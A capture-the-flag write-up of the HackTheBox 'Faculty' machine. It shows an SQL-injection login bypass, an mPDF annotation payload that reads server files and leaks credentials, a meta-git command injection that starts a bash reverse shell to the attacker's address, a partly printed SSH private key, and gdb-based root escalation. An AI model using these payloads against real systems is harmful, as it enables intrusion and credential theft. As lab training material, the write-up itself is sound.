Hello and welcome back to another write up. This one will be for box Faculty from Hackthebox. Without
further adue let's get to it. 

We will start with nmap scan. 

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 13:51 EDT
Nmap scan report for 10.10.11.169 (10.10.11.169)
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
We have two open ports - 80 which is http and 22 which is ssh. There is not much we can do with ssh so we will focus
on port 80 for now. Nmap shows us hostname faculty.htb so we will add to our `/etc/hosts` file with command 
`echo "10.10.11.169 faculty.htb" >> /etc/hosts`. Now let's visit the page itself. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Faculty/images/faculty_web.png?raw=true)

We are presented with login page that runs php. Now we will start feroxbuster
to brute force directories. With knowledge that it is php we will run it with flag that specifies just that. 

```
302      GET      359l      693w        0c http://faculty.htb/ => login.php
301      GET        7l       12w      178c http://faculty.htb/admin => http://faculty.htb/admin/
500      GET        0l        0w        0c http://faculty.htb/test.php
200      GET      132l      235w        0c http://faculty.htb/login.php
200      GET      175l      311w        0c http://faculty.htb/admin/login.php
200      GET        1l        0w        0c http://faculty.htb/admin/download.php
301      GET        7l       12w      178c http://faculty.htb/admin/database => http://faculty.htb/admin/database/
301      GET        7l       12w      178c http://faculty.htb/admin/assets => http://faculty.htb/admin/assets/
200      GET        0l        0w        0c http://faculty.htb/admin/ajax.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets/js => http://faculty.htb/admin/assets/js/
200      GET       70l      105w        0c http://faculty.htb/admin/users.php
200      GET      106l      167w        0c http://faculty.htb/admin/home.php
-----redacted-----
```

There are many pages but for now let's focus on the default one. If I try to guess id it says that it is invalid. 
we will workaround that and try sql injection. With the simpliest `'or 1=1-- -` we get in. We also get PHPSESSID cookie.
There is nothing interesting. So time to move to admin directory which was found from feroxbuster. 

FACULTY ADMIN IMAGE

It is some type of management system. First thing that I noticed is the export functionality because these aren't common
in ctfs if they don't have a purpose. It creates pdf and saves it on the server. Let's download it and find out if there isn't 
any interesting info about how it is created. For this I used exiftool but there many ways to find this out.

```
# exiftool OKLZOtslJv4TycbW8Xaf50HxIV.pdf 
ExifTool Version Number         : 12.44
File Name                       : OKLZOtslJv4TycbW8Xaf50HxIV.pdf
Directory                       : .
File Size                       : 1742 bytes
File Modification Date/Time     : 2022:10:28 16:23:26-04:00
File Access Date/Time           : 2022:10:28 16:23:26-04:00
File Inode Change Date/Time     : 2022:10:28 16:23:26-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Page Layout                     : OneColumn
Producer                        : mPDF 6.0
Create Date                     : 2022:10:28 21:22:02+01:00
Modify Date                     : 2022:10:28 21:22:02+01:00
```

The important thing to note here is the producer - mPDF 6.0. When I first tried to search for vulnerabilities for this version
I couldn't find anything. After that I resorted to looking at github page for this project. After a tidious work we find this
issue(https://github.com/mpdf/mpdf/issues/356) talking about LFI vulnerability caused by injecting annotation tag when generating pdf. (With payload below)

```
 <annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

This looks useful to us. Now we will catch the burpsuite request and change the contents of the request to this payload. 
We see that the parameter payload gets base64 encoded before it gets send. 

BURP IMAGE 1

This can be done numerous ways - cyberchef, commandline
or in burp itself. The final request looks like this:

BURP IMAGE 2

At first sight it looks like it didn't work but when we look at the attachements on the left there is a passwd which is the file 
we wanted. 

PDF IMAGE 1

Now using the same method but changing the file name in payload we will get the source code for the application. We will start with `index.php`. 

SOURCE 1 IMAGE

Now we will download the `login.php` (found in feroxbuster on in the `index.php` file). This one shows 
`include('./db_connect.php');` this looks promising as it is likely to leak some creadentials and as we find out it does. 

DB CONNECT IMAGE

We have now have password which we can try to use with ssh. But to which user does it belong to ? We have users
that are on the box in passwd file we got earlier. Let's grep for users with `/bin/bash` shell.

```
# cat passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash

```

If we try one by one we find that it works for the user gbyolo. Running `sudo -l` as first thing shows us that
we have permission to run meta-git as developer user. 

```
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

Meta-git isn't on gtfo bins so we have to look somewhere how to weaponize it. I found this hackerone report - 
https://hackerone.com/reports/728040. With this I'll create bash shell and put it in /tmp/shell.sh

```
gbyolo@faculty:/tmp$ cat shell.sh 
bash -i >& /dev/tcp/10.10.14.141/4242 0>&1
```

Set up a nc listener and run command `sudo -u developer /usr/local/bin/meta-git clone 'sss||bash /tmp/shell.sh'` and we have
connection at our netcat. I could upgrade our shell but since developer has .ssh directory with id_rsa in it, I can just
use that and use it to connect to the box.

```
developer@faculty:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
pribX/DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
KpI0WqAWNSXHDDvcwDpmWDk+NlIRKkpGcVByzhG8x1azvKWS9G36zeLLARBP43ax4eAVrs
Ad+7ig3vl9Iv+ZtRzkH0PsMhriIlHBNUy9dFAGP5aa4ZUkYHi1/MlBnsWOgiRHMgcJzcWX
OGeIJbtcdp2aBOjZlGJ+G6uLWrxwlX9anM3gPXTT4DGqZV1Qp/3+JZF19/KXJ1dr0i328j
saMlzDijF5bZjpAOcLxS0V84t99R/7bRbLdFxME/0xyb6QMKcMDnLrDUmdhiObROZFl3v5
-----snip snip-----
```

Now I downloaded copy of linpeas from my python server. 
```
developer@faculty:/tmp$ wget http://10.10.14.132:8000/linpeas.sh                                                                   
--2022-11-01 20:25:54--  http://10.10.14.132:8000/linpeas.sh
Connecting to 10.10.14.132:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776073 (758K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                  100%[========================================================================================================================================>] 757.88K  1.04MB/s    in 0.7s    

2022-11-01 20:25:54 (1.04 MB/s) - ‘linpeas.sh’ saved [776073/776073]

developer@faculty:/tmp$ chmod +x linpeas.sh 
developer@faculty:/tmp$ ./linpeas.sh 

```

We find this
```
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb                                                                                                                                                                                    
```
No we need to find process to attach to gdb. 
```
developer@faculty:/tmp$ ps -aux | grep root
```
After few tries I found that this can be used:
```
root         729  0.0  0.9  26896 18220 ?        Ss   21:22   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers

```
I attach it to gdb with 
```
gdb -p <PID>
```
(in my case 729).
Now I found that to call function from gdb (https://www.zeuthen.desy.de/dv/documentation/unixguide/infohtml/gdb/Calling.html) you can use `call $expr`
So the final exploit looks like this:

```
developer@faculty:/tmp$ gdb -p 729
(gdb) call ("chmod +s /bin/bash")

```
This makes bash setuid and with tag -p it keeps permission so I get root shell.

```
developer@faculty:/tmp$ ls -la /bin/bash
-rwsr-s--x 1 root root 1183448 Apr 18  2022 /bin/bash
developer@faculty:/tmp$ /bin/bash -p
bash-5.0# id
uid=1001(developer) gid=1002(developer) euid=0(root) egid=0(root) groups=0(root),1001(debug),1002(developer),1003(faculty)
bash-5.0# cat /root/root.txt
887e---redacted-------
```
This wraps up the box.
Thank you for reading this write up. If you have any questions, feedback or suggestion or just want to play ctfs with someone you can reach out to me at
https://twitter.com/Vojtech1337